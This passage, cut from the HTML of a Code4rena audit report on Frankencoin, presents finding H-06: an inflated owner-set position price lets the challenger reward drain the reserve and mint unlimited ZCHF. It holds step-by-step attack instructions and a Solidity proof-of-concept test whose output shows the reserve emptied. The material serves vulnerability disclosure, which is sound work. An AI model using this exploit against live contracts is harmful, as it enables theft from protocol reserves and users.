path. Satisfactory.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-06-challenger_reward-can-be-used-to-drain-reserves-and-free-mint\" style=\"position:relative;\"><a href=\"#h-06-challenger_reward-can-be-used-to-drain-reserves-and-free-mint\" aria-label=\"h 06 challenger_reward can be used to drain reserves and free mint permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/458\">[H-06] <code>CHALLENGER_REWARD</code> can be used to drain reserves and free mint</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/458\">Lirios</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/973\">shalaamum</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/954\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/830\">0xDACA</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/805\">Kumpa</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/669\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/666\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/661\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/621\">cccz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/603\">said</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/569\">tallo</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/566\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/423\">Emmanuel</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/389\">BenRai</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/362\">jangle</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/357\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/315\">bughunter007</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/309\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/300\">cccz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/247\">nobody2018</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/194\">SpicyMeatball</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/176\">117l11</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/138\">117l11</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/71\">ChrisTina</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/67\">vakzz</a></em></p>\n<p>The goal of the auction mechanism is to determine the fair price of the collateral, so that Frankencoin (ZCHF) is always sufficiently backed and the system remains in balance.</p>\n<p>If the challenge is successful, the bidder gets the collateral from the position and the position is closed, distributing excess proceeds to the reserve and paying a reward to the challenger.</p>\n<p>The reward for the challenger is based on the user provided price and can be abused to have the protocol pay unlimited rewards.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When a challenge ends without being Averted, the <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L252\">end()</a> function can be called to process the liquidation.\nThis process pays back the minted <code>ZCHF</code> tokens with the bid and sends the collateral to the bidder. The challenger receives back the collateral he supplied when starting the challenge, and receives a <code>CHALLENGER_REWARD</code> of 2% of the challenged collateral value in <code>ZCHF</code>.</p>\n<p>To calculate the value of the reward, it uses\n<a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L265\">uint256 reward = (volume * CHALLENGER<em>REWARD) / 1000\\</em>000;</a> with <code>volume</code> being the <code>volumeZCHF</code> value returned from <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L329\">Position.notifyChallengeSucceeded()</a><br>\nThis is calculated as<br>\n<code>uint256 volumeZCHF = _mulD18(price, _size);</code><br>\n<code>// How much could have minted with the challenged amount of the collateral</code><br>\nmeaning that if the price is very high, the theoretical volumeZCHF  will be very high too.</p>\n<p>When there are insufficient funds in the Position to pay for the reward, <code>FrankenCoin.notifyLoss()</code> is used to get the funds from the reserve and mint new coins.</p>\n<p>The price of a Position can be set when it is created, or later by the owner via an adjustPrice call.<br>\nThe steps to take:</p>\n<ol>\n<li>Position owner mints the maximum ZCHF.</li>\n<li>Position owner adjusts price and sets it to a very large value.</li>\n<li>Owner immediately starts a challenge via MintingHub\nWhen price is very high, if there are bids, they will never pass the AvertChallenge check of <code>_bidAmountZCHF * ONE_DEC18 >= price * _collateralAmount</code> so the Challenge will always succeed.</li>\n<li>After the challenge period, the end()  function can be called, and Challenger will receive a high amount of ZCHF as a fee.</li>\n</ol>\n<p>An alternative and faster way is to create a new position and immediately challenge it.</p>\n<p>When creating a Position, <code>_challengeSeconds</code> can be set to 0 and calling <code>launchChallenge</code> is possible before Position start waiting time is over. This makes it possible for any user to drain all reserves and mint a large number of ZCHF in 1 transaction.</p>\n<p><strong>POC Script</strong></p>\n<p>A proof of concept testscript is created to demonstrate the vulnerability.\nThis code was added to <code>GeneralTest.t.sol</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">showBalances</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hacker</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;================ Balances ================&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;hacker xchf     :&#39;</span><span class=\"mtk1\">,</span><span class=\"mtk12\">xchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">)/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;hacker zchf     :&#39;</span><span class=\"mtk1\">,</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">)/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;reserver zchf   :&#39;</span><span class=\"mtk1\">,</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">reserve</span><span class=\"mtk1\">()))/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;zchf.totalSupply:&#39;</span><span class=\"mtk1\">,</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">()/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39; &#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test10AbuseChallengeReward</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">test04Mint</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// let bob/alice open position so not all is empty </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// init, start wit 2 xchf and 1000 zhf</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hacker</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0xBaDbaDBAdBaDBaDbaDbABDbAdBAdBaDbADBadB01</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">TestToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">xchf_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">TestToken</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">swap</span><span class=\"mtk1\">.</span><span class=\"mtk11\">chf</span><span class=\"mtk1\">()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">xchf_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1002</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">xchf_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">swap</span><span class=\"mtk1\">),  </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">swap</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">showBalances</span><span class=\"mtk1\">(); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// open a position with fake inflated price and dummy collateral. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// _challengeSeconds to 0 so we can immediately challenge and end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">xchf_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">),  </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">),  </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// 1000 OPENING_FEE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">myPosition</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">hub</span><span class=\"mtk1\">.</span><span class=\"mtk11\">openPosition</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">xchf_</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// _collateralAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// _minCollateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// _initialCollateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,     </span><span class=\"mtk3\">// _mintingMaximum</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,         </span><span class=\"mtk3\">// _initPeriodSeconds minimum perios</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,        </span><span class=\"mtk3\">// _expirationSeconds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,              </span><span class=\"mtk3\">// _challengeSeconds set to 0 to immediately challenge and end </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,              </span><span class=\"mtk3\">//_mintingFeePPM, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e20</span><span class=\"mtk1\">,  </span><span class=\"mtk3\">// _liqPrice - huge inflated price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">               </span><span class=\"mtk3\">// _reservePPM</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Creates our Position with inflated price, 1000 opening fee to reserves 1 xchf as collateral&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">showBalances</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;Start launchChallenge and immediately end the auction.&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;We will receive the 1 xchf collateral back&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;and 2% of inflated collateral price in zchf as CHALLENGER_REWARD&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;zchf is first taken all from reserve, and rest minted&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">xchf_</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hub</span><span class=\"mtk1\">),  </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">challengeID</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">hub</span><span class=\"mtk1\">.</span><span class=\"mtk11\">launchChallenge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">myPosition</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">hub</span><span class=\"mtk1\">.</span><span class=\"mtk11\">end</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challengeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">showBalances</span><span class=\"mtk1\">(); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The results of the test</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] test10AbuseChallengeReward() (gas: 3939346)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ================ Balances ================</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  hacker xchf     : 2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  hacker zchf     : 1000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  reserver zchf   : 23500</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  zchf.totalSupply: 102000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  We have creates our Position with inflated price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ================ Balances ================</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  hacker xchf     : 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  hacker zchf     : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  reserver zchf   : 24500</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  zchf.totalSupply: 102000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Start launchChallenge and immediately end the auction.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  We will receive the 1 xchf collateral back</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  and 2% of inflated collateral price in zchf as CHALLENGER_REWARD</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  zchf is first taken all from reserve, and rest minted</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ================ Balances ================</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  hacker xchf     : 2</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  hacker zchf     : 23158417847463239084714197001737581570</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  reserver zchf   : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  zchf.totalSupply: 23158417847463239084714197001737659070</span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual review, forge</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It would be recommeded to restrict the moments when challenges can be started so Positions cannot be challenged before start time and when they are denied.\nThis will make challenges only possible when a position once was valid, with a valid price.</p>\n<p>To prevent owners to change the price of their Position to an extremenly large value, it can be limited to change the price max x% per adjustment.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/458#issuecomment-1529099536\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is probably the most important issue revealed during the audit. The warden deserves a big reward for this!</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-15\" style=\"position:relative;\"><a href=\"#medium-risk-findings-15\" aria-label=\"medium risk findings 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (15)</h1>\n<h2 id=\"m-01-function-restructurecaptable-in-equitysol-not-functioning-as-expected-\" style=\"position:relative;\"><a href=\"#m-01-function-restructurecaptable-in-equitysol-not-functioning-as-expected-\" aria-label=\"m 01 function restructurecaptable in equitysol not functioning as expected  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a 